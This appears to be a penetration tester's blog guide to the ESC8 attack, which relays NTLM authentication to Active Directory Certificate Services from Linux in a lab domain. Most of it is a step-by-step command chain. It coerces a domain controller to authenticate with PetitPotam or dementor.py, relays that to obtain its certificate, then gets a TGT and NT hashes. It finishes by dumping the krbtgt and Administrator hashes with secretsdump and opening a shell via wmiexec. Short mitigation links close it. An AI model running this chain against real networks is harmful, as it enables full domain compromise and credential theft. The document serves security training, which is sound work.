---
title: "AD CS NTLM Relay Attack from Linux"
date: 2022-06-17
description: "Guide to exploiting 'ESC8 — NTLM Relay to AD CS HTTP Endpoints' from Linux to compromise a domain"
summary: "Guide to exploiting 'ESC8 — NTLM Relay to AD CS HTTP Endpoints' from Linux to compromise a domain"
tags: ["Active Directory", "AD CS"]
---

This is nothing new, I am just documenting my approach to exploiting an Active Directory (AD) environment with a misconfigured Active Directory Certificate Services (AD CS). This is only one method of many... I highly recommended to read the original research on attacking AD CS by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) - [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2). I also recommend reading [this blog post](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6) for more details about [Certipy](https://github.com/ly4k/Certipy), which is a fantastic tool for enumerating and abusing AD CS.

## Overview and Background

The Certificate Authority Web Enrollment, Certificate Enrollment Policy Web Service, and Network Device Enrollment Service roles in AD CS support HTTP-based certificate enrollment. If NTLM relay protections are not enabled (by default they are not), then these enrollment interfaces are vulnerable to NTLM relay attacks. We will focus on the Web Enrollment interface which is accessible via `http://<ca-server>/certsrv/`, as I have seen this endpoint on several internal networks. This endpoint by default only supports HTTP (which cannot protect against NTLM relay attacks) and allows NTLM authentication.

One of the most frustrating parts of an internal (for me) has always been waiting for a high privilege accounts to attempt to connect to Responder, so you can capture and try relay the hash to another host which has SMB signing disabled. However, tools such as [PetitPotam](https://github.com/topotam/PetitPotam) and [SpoolSample](https://github.com/leechristensen/SpoolSample) ([Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) - python implementation) have come to the aid of impatient attackers waiting for hashes to roll in, and provides a way to coerce an account to authenticate to us. In this post, we will coerce authentication from the Domain Controller (DC) to our attacker machine, which is configured to relay the NTLM authentication request to a vulnerable CA Web Enrollment endpoint. Once the certificate is intercepted, it can be used to request a Ticket Granting Ticket (TGT) for the `DC$` machine account - allowing us to Pass-the-Ticket or UnPAC and Pass-the-Hash to compromise the domain.

## Lab Notes

- Domain: `lab.local`

- Domain Controller:
	- Windows Server 2019
	- `dc.lab.local`
	- 172.30.0.136
- Certificate Authority:
	- Windows Server 2016
	- `ca.lab.local`
	- 172.30.0.21
- Attacker Machine:
	- Ubuntu 22.04
	- 172.30.0.232
- Assumption that the following user account has been compromised:
	- Username: jdoe
	- Password: Password123

	<img width="60%" src="/images/ad/adcs-esc8/jdoe-user-properties.png"/>


For the NTLM relay attack to work, the following conditions need to be true:

- AD CS is running either of these services:
	- Certificate Authority Web Enrollment
	- Certificate Enrollment Web Service

	<img width="60%" src="/images/ad/adcs-esc8/adcs-enrollment-services.png"/>

- NTLM-based authentication is supported and Extended Protection for Authentication (EPA) is not configured (these are the default settings)

| NTLM Auth Enabled | EAP Disabled |
| ----------------- | ------------ |
| ![NTLM Auth Enabled](/images/ad/adcs-esc8/ntlm-based-auth-enabled.png) | ![EAP Disabled](/images/ad/adcs-esc8/eap-disabled.png) |

If you are building a lab to test this on yourself, keep in mind that:

- You cannot relay NTLM credentials to the same host that is initiating the authentication request. This is called NTLM reflection and it used to work but has been patched (several times). So make sure you don't set up your CA (running AD CS) on the same host as the DC.

- When requesting a Kerberos authentication ticket (TGT), if you get the following error: `KDC_ERR_CLIENT_NOT_TRUSTED`, you have likely not imported the CA certificate into the DC.

	> This typically happens when user’s smart-card certificate is revoked or the root Certification Authority that issued the smart card certificate (in a chain) is not trusted by the domain controller.


## Attacking ADCS (esc8)

### Tools

Note: you won't need all of these tools, as I am covering various ways to perform the attack. So use whatever tool(s) work for you.


 - OS Requirements

	```bash
	sudo apt install -y python3 python3-pip ldap-utils
	```

 - [Certipy](https://github.com/ly4k/Certipy)

	```bash
	git clone https://github.com/ly4k/Certipy
	cd Certipy
	sudo python3 setup.py install
	```

 - [Impacket](https://github.com/SecureAuthCorp/impacket) - You no longer need the ExAndroidDev fork of impacket, as their awesome work (ntlmrelayx-adcs-attack branch) was merged into SecureAuthLab's master branch.

	```bash
	git clone https://github.com/SecureAuthCorp/impacket
	cd impacket
	sudo python3 -m pip install -r requirements.txt
	sudo python3 -m pip install .
	```

 - [PKINITtools](https://github.com/dirkjanm/PKINITtools)

	```bash
	git clone https://github.com/dirkjanm/PKINITtools
	cd PKINITtools
	python3 -m pip install -r requirements.txt
	```

 - [PetitPotam](https://github.com/topotam/PetitPotam)

	```bash
	git clone https://github.com/topotam/PetitPotam
	```  	

 - [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket)

	```bash
	git clone https://github.com/NotMedic/NetNTLMtoSilverTicket
	```  	 

### Identify the CA (Manually)

On Linux, if you don't already know the CA server details, you can try find it using the following query - which should return members of the "Cert Publisher" group. As per Windows:

> Members of this group are permitted to publish certificates to the directory.

```bash
ldapsearch -LLL -x -H ldap://172.30.0.136 -b "dc=lab,dc=local" -D jdoe@lab.local -w Password123 "(&(objectCategory=group)(cn=Cert Publishers))"
```

![ldapsearch-cert-publishers](/images/ad/adcs-esc8/ldapsearch-cert-publishers.png)

You could also try searching by computer description:

```bash
ldapsearch -LLL -x -H ldap://172.30.0.136 -b "dc=lab,dc=local" -D jdoe@lab.local -w Password123 "(&(objectCategory=computer)(description=*cert*))"
```

![ldapsearch-computer-description](/images/ad/adcs-esc8/ldapsearch-computer-description.png)

On Windows, you can use the `certutil` application to easily identify the CA:

```bash
certutil.exe
```

![certutil](/images/ad/adcs-esc8/certutil.png)

Once you have identified the CA server, open a web browser and verify that the certificate web enrollement service is running:

![adcs-http-web-enrollment](/images/ad/adcs-esc8/adcs-http-web-enrollment.png)

### Enumerate AD CS Configuration

We will use [Oliver Lyak's](https://twitter.com/ly4k_) python implementation of Ceritfy - [Certipy](https://github.com/ly4k/Certipy) (which will also identify the CA for us), to enumerate details about the AD CS configuration - specifically which templates are supported. As per the github readme:

> The `find` command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations.

```bash
certipy find 'lab.local/jdoe:Password123@dc.lab.local'
```

![certipy-adcs-enumeration](/images/ad/adcs-esc8/certipy-adcs-enumeration.png)

Looking at the output, we can see that Ceritpy identified the CA server and that the HTTP Web Enrollment service is enabled:

<img width="70%" src="/images/ad/adcs-esc8/certipy-find-output.png"/>

There are some [custom bloodhound queries](https://github.com/ly4k/Certipy/blob/main/customqueries.json) which can quickly identify misconfigured certificate templates.

<img width="70%" src="/images/ad/adcs-esc8/bloodhound-custom-queries.png"/>

Note: this is only scratching the surface of what you can do with Certipy. It is an extremely useful offensive tool for abusing AD CS. I found this out close to the end of writing this blog as I had the tool on my list of things to read but didn't get around to it until it was too late.


### NTLM Relay Set Up

The first step is to set up our attacker machine to perform the NTLM relay attack using [impacket's ntlmrelayx](https://github.com/SecureAuthCorp/impacket)

```bash
sudo python3 impacket/examples/ntlmrelayx.py -debug -smb2support --target http://ca.lab.local/certsrv/certfnsh.asp --adcs --template DomainController
```

<img width="70%" src="/images/ad/adcs-esc8/ntlmrelayx-relay-setup.png"/>


### Coercing Authentication of the DC to our Attacker Machine

Next, we need to coerce authentication of the DC to our attacker machine, so we can relay the authentication request to the CA.


`PetitPotam.py -d <domain> -u <user> -p <password> <attacker-ip> <target-ip>`

```bash
python3 PetitPotam/PetitPotam.py -d lab.local -u jdoe -p Password123 172.30.0.232 172.30.0.136
```

After executing PetitPotam, the authentication request is relayed via our attacker machine to the CA server and a certificate was issued for the DC machine account (`DC$`).

![ntlmrelayx-petitpotam-execute](/images/ad/adcs-esc8/ntlmrelayx-petitpotam-execute.png)

Looking at the CA server, we can see that the new certificate (Request ID:4) that has been issued:

<img width="70%" src="/images/ad/adcs-esc8/ca-new-dc-cert.png"/>


### Pass-the-Ticket

We need to decode the base64 encoded certificate blob that we intercepted and write the output into a file.

```bash
echo "MIIRpQIBAzCCEV8GCSqGSIb3DQEHAa..." | base64 -d > cert.pfx
```

We can then use the certificate to impersonate the DC machine account (`DC$`) and use [DirkJam’s gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) script to request a Ticket Granting Ticket (TGT).

```bash
python3 PKINITtools/gettgtpkinit.py 'lab.local/dc$' -cert-pfx cert.pfx dc.ccache
```

![request-tgt](/images/ad/adcs-esc8/request-tgt.png)

Now that we have a valid TGT, we need to request a Service Ticket (ST) ticket with Kerberos S4U2Self. This can be done using [DirkJam’s gets4uticket](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) script to obtain a service ticket to the CIFS service for the local administrator of the DC - this is known as a silver ticket 🎟.

```bash
KRB5CCNAME=dc.ccache python3 PKINITtools/gets4uticket.py 'kerberos+ccache://lab.local\dc$:dc.ccache@dc.lab.local' cifs/dc.lab.local@auralab.local Administrator@lab.local Administrator.ccache -v
```

![request-s4u-admin](/images/ad/adcs-esc8/request-s4u-admin.png)

Finally we can pass-the-ticket and use [impacket's secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) script to loot the DC's `NTDS.dit` file. As an example, we can retrieve the hash of the `krbtgt` account, allowing us to craft golden tickets 🎫.

```bash
KRB5CCNAME=Administrator.ccache python3 impacket/examples/secretsdump.py -just-dc-ntlm -user-status -k lab.local/Administrator@dc.lab.local -no-pass -just-dc-user Administrator
```

Dumping the entire `NTDS.dit` file is a bit overkill on an engagement as all of the user accounts and service accounts *should* be reset after they have been compromised. On a large customer network, with several hundred service accounts being used, this could cause many hours of work.

![ptt-secrets-dump-krbtgt](/images/ad/adcs-esc8/ptt-secrets-dump-krbtgt.png)

```bash
KRB5CCNAME=Administrator.ccache python3 impacket/examples/secretsdump.py -just-dc-ntlm -user-status -debug -k lab.local/Administrator@dc.lab.local -no-pass -outputfile dc-lab-secretsdump
```

![ptt-secrets-dump-all](/images/ad/adcs-esc8/ptt-secrets-dump-all.png)

### Alternatively: UnPAC and Pass-the-Hash

Instead of passing the ticket, we could extract the NT hash of the DC machine account (`DC$`). This is done using [DirkJam’s getnthash](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) script and the previously obtained TGT. A service ticket request (TGS-REQ) is sent to the KDC for user-to-user (U2U) authentication. The service ticket response (TGS-REP) contains the `PAC_CREDENTIAL_INFO`, which was encrypted with the session key (`AS-REP`) from the original TGT and can be used to extract the NT hash of the DC machine account.

```bash
KRB5CCNAME=dc.ccache sudo python3 PKINITtools/getnthash.py 'lab.local/dc$' -key db89b471b9aae3e77255158503d64badc6354c325b7937074924bfd0b0b09dfd
```

![recover-nt-hash](/images/ad/adcs-esc8/recover-nt-hash.png)

Note: Machine accounts (in this case `DC$`) don't have enough privileges to execute commands with wmiexec. However, we can use the NT hash of the DC machine account to retrieve the DC local Administrator NTLM hash.

```bash
sudo python3 impacket/examples/secretsdump.py -hashes :fbe7ae23ece0b7fe4a3f2d1dfde5682a 'lab.local/dc$@dc.lab.local' -just-dc-user Administrator
```

![recover-dc-localadmin-hash](/images/ad/adcs-esc8/recover-dc-localadmin-hash.png)

Once we have obtained the NTLM hash of the local Administrator account for the DC, we can perform a pass-the-hash attack and gain shell access using [impacket's wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) script.

```bash
sudo python3 impacket/examples/wmiexec.py -hashes :4ea013e3dcbd5ee3bb088615b7589b19 lab.local/Administrator@dc.lab.local
```

![wmiexec-dc-shell.png](/images/ad/adcs-esc8/wmiexec-dc-shell.png)

We could also have used the NT hash of the DC machine account to retrieve the NTLM hash of the `krbtgt` account - allowing us to generate golden tickets.

```bash
sudo python3 impacket/examples/secretsdump.py -hashes :fbe7ae23ece0b7fe4a3f2d1dfde5682a 'lab.local/dc$@dc.lab.local' -just-dc-user krbtgt
```

![recover-krbtgt-hash](/images/ad/adcs-esc8/recover-krbtgt-hash.png)

## Notice me Certipy

As I mentioned earlier, you could actually perform most of the attack chain with Certipy. Additionally, Certipy can exploit many more AD CS misconfigurations and will be my go-to tool in the future when it comes to attacking AD CS.


### NTLM Relay Setup

```bash
sudo certipy relay -ca ca.lab.local -template DomainController
```

![certipy-relay-setup](/images/ad/adcs-esc8/certipy-relay-setup.png)


### Coercing Authentication of the DC to our Attacker Machine

To keep things a little interesting at this point, let's use [3xocyte's dementor.py](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) script to exploit the print spooler ([SpoolSample](https://github.com/leechristensen/SpoolSample)) bug. This will have the same effect of coercing authentication of the DC to our attacker machine.

Check if the Print System Remote Protocol (`spoolss`) is enabled by querying the [RPC UUID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515) using [impacket's rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) script:

```bash
python3 impacket/examples/rpcdump.py dc.lab.local | grep "12345678-1234-ABCD-EF00-0123456789AB" -B 2
```

![rpcdump-spoolss](/images/ad/adcs-esc8/rpcdump-spoolss.png)

`python3 dementor.py <attacker-ip> <target-ip> -u <username> -p <password> -d <domain>`

```bash
python3 NetNTLMtoSilverTicket/dementor.py 172.30.0.232 172.30.0.136 -u jdoe -p Password123 -d lab.local
```

![certipy-dementor-execute](/images/ad/adcs-esc8/certipy-dementor-execute.png)

If the relay attack is successful, the certificate and private key will be saved as a PFX file - `dc.pfx` in this instance.


### Pass-the-Ticket or UnPAC and Pass-the-Hash

Similar to how to did before, we can obtain a TGT and recover the NT hash of the DC machine account using the `auth` command of Certipy. As per the readme:

> The  `auth` command will use the PKINIT Kerberos extension to authenticate with the provided certificate to retrieve a TGT and the NT hash of the user.

```bash
certipy auth -pfx dc.pfx
```

<img width="70%" src="/images/ad/adcs-esc8/certipy-auth.png"/>

You could now either pass-the-ticket using the credential cache (`dc.ccache`) or pass-the-hash of the `DC$` machine account and execute impackets secretsdump as I have already covered previously.


## Mitigation

- "Harden AD CS HTTP Endpoints – PREVENT8" of the original [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) covers the mitigation of this issue.
- https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429

## Links & References

- Will Schroeder & Lee Christensen - Certified Pre-Owned: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- Gilles Lionel - PetitPotam POC: https://github.com/topotam/PetitPotam
- https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate
- https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux
- https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/
- https://www.thehacker.recipes/ad/movement/ad-cs
- https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash


# Acknowledgements

Obviously to all the researchers and people who make these offensive tools.

Also a shoutout to my employer [Aurainfosec](https://www.aurainfosec.com/) for giving me time to learn and upskill :)
